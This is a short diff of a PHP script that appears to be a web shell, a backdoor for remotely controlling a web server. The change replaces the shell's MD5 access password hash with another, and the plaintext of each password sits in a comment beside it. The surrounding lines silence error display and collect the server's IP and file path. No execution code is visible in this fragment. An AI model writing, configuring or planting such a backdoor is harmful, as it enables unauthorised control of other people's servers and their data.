@@ -24,7 +24,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "9f3ed52638be652c4d26e8d715c80c66"; # md5: p4kl0nc4t
+$password = "8ec2e4dc59e0e8ce2a05754205dbe29a"; # md5: SpamXBot
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
